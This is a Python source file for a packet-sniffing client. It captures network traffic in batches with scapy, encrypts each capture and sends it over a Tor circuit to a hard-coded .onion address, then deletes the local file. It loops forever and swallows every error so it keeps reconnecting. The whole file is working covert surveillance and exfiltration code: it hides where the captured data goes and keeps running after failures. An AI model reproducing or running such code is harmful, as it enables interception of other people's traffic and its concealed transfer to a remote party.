from torpy import TorClient
from scapy.all import wrpcap
from os import remove
from time import sleep

from encryption import encrypt
from sniffing import packet_sniff

HOSTNAME = "524jkwd2v5gnigyq.onion"
PORT = 8080
NUMBER_OF_PACKETS_TO_SNIFF = 50

while True:
    try:
        print("Establishing Connection Via Tor Circuits.")
        with TorClient() as tor:
            with tor.create_circuit(3) as circuit:
                with circuit.create_stream((HOSTNAME,PORT)) as stream:
                    counter = 1
                    print("Client Connected!")

                    while True:
                        sleep(2)

                        print(str(counter) + " - sniffing")
                        packets = packet_sniff(NUMBER_OF_PACKETS_TO_SNIFF)

                        print(str(counter) + " - sniffed")
                        wrpcap("file.pcap", packets)
                        rfile = open("file.pcap", "rb")
                        packets = rfile.read()
                        
                        print(str(counter) + " - sending")
                        packets = encrypt(packets)
                        stream.send(packets)
                        stream.send(b"fin")
                        print(str(counter) + " - sent")

                        rfile.close()
                        remove("file.pcap")
                        #p = sniffing.packet_to_bytes(p)
                        counter += 1
    except:
        continue